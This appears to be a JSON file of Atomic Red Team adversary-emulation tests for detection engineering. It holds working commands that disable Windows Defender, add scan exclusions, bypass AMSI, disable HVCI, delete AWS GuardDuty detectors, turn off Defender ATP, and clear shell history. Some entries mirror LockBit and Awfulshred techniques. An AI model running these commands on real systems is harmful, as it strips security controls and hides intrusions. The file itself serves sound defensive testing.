      "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
      "description": "LockBit Black - Disable Privacy Settings Experience Using Registry",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1",
        "procedure": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "d6d22332-d07d-498f-aea0-6139ecb7850e"
    },
    {
      "name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
      "description": "LockBit Black - Use Registry Editor to turn on automatic logon",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1",
        "procedure": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70"
    },
    {
      "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
      "description": "LockBit Black - Disable Privacy Settings Experience Using Registry",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore",
        "procedure": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force"
      },
      "input_arguments": [],
      "auto_generated_guid": "d8c57eaa-497a-4a08-961e-bd5efd7c9374"
    },
    {
      "name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
      "description": "Lockbit Black - Use Registry Editor to turn on automatic logon",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore",
        "procedure": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force"
      },
      "input_arguments": [],
      "auto_generated_guid": "5e27f36d-5132-4537-b43b-413b0d5eec9a"
    },
    {
      "name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
      "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore"
      },
      "input_arguments": [],
      "auto_generated_guid": "f542ffd3-37b4-4528-837f-682874faa012"
    },
    {
      "name": "WMIC Tamper with Windows Defender Evade Scanning Folder",
      "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"",
        "procedure": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\""
      },
      "input_arguments": [],
      "auto_generated_guid": "59d386fc-3a4b-41b8-850d-9e3eee24dfe4"
    },
    {
      "name": "Delete Windows Defender Scheduled Tasks",
      "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f",
        "procedure": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "The Windows Defender scheduled tasks must be backed up first",
          "prereq_command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )",
          "get_prereq_command": "schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\""
        }
      ],
      "auto_generated_guid": "4b841aa1-0d05-4b32-bbe7-7564346e7c76"
    },
    {
      "name": "Clear History",
      "description": "Clear Shell History. This technique only affect the bash shell application.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "procedure": "history -c"
      },
      "input_arguments": [],
      "auto_generated_guid": "23b88394-091b-4968-a42d-fb8076992443"
    },
    {
      "name": "Suspend History",
      "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "set -o history",
        "procedure": "set +o history"
      },
      "input_arguments": [],
      "auto_generated_guid": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4"
    },
    {
      "name": "Reboot Linux Host via Kernel System Request",
      "description": "reboot system via system request seen in Awfulshred wiper.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "procedure": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger"
      },
      "input_arguments": [],
      "auto_generated_guid": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e"
    },
    {
      "name": "Clear Pagging Cache",
      "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "procedure": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches"
      },
      "input_arguments": [],
      "auto_generated_guid": "f790927b-ea85-4a16-b7b2-7eb44176a510"
    },
    {
      "name": "Disable Memory Swap",
      "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "swapon -a\nsleep 2\nsync",
        "procedure": "swapon -a \nsleep 2\nswapoff -a\nsync"
      },
      "input_arguments": [],
      "auto_generated_guid": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114"
    },
    {
      "name": "Disable Hypervisor-Enforced Code Integrity (HVCI)",
      "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f",
        "procedure": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "HVCI must be enabled",
          "prereq_command": "if (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }",
          "get_prereq_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f"
        }
      ],
      "auto_generated_guid": "70bd71e6-eba4-4e00-92f7-617911dbe020"
    },
    {
      "name": "AMSI Bypass - Override AMSI via COM",
      "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "REG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f",
        "procedure": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "17538258-5699-4ff1-92d1-5ac9b0dc21f5"
    },
    {
      "name": "AWS - GuardDuty Suspension or Deletion",
      "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.",
      "supported_platforms": [
        "iaas:aws"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": false,
        "cleanup_command": "echo \"If test successfully ran, no cleanup required.\"",
        "procedure": "detectorId=$(aws guardduty create-detector --enable --region \"#{region}\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId"
      },
      "input_arguments": [
        {
          "arg_name": "region",
          "description": "Name of the specified region",
          "type": "string",
          "default": "us-east-1"
        }
      ],
      "dependencies": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured",
          "prereq_command": "cat ~/.aws/credentials | grep \"default\"",
          "get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\""
        }
      ],
      "auto_generated_guid": "11e65d8d-e7e4-470e-a3ff-82bc56ad938e"
    },
    {
      "name": "Tamper with Defender ATP on Linux/MacOS",
      "description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide",
      "supported_platforms": [
        "linux",
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo mdatp config real-time-protection --value enabled",
        "procedure": "sudo mdatp config real-time-protection --value disabled"
      },
      "input_arguments": [],
      "auto_generated_guid": "40074085-dbc8-492b-90a3-11bcfc52fda8"
    },
    {
      "name": "Tamper with Windows Defender Registry - Reg.exe",
      "description": "Disable Windows Defender by tampering with windows defender registry using the utility \"reg.exe\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul",
        "procedure": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul"
      },
      "input_arguments": [],
      "auto_generated_guid": "1f6743da-6ecc-4a93-b03f-dc357e4b313f"
    },
    {
      "name": "Tamper with Windows Defender Registry - Powershell",
      "description": "Disable Windows Defender by tampering with windows defender registry through powershell",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1",
        "procedure": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  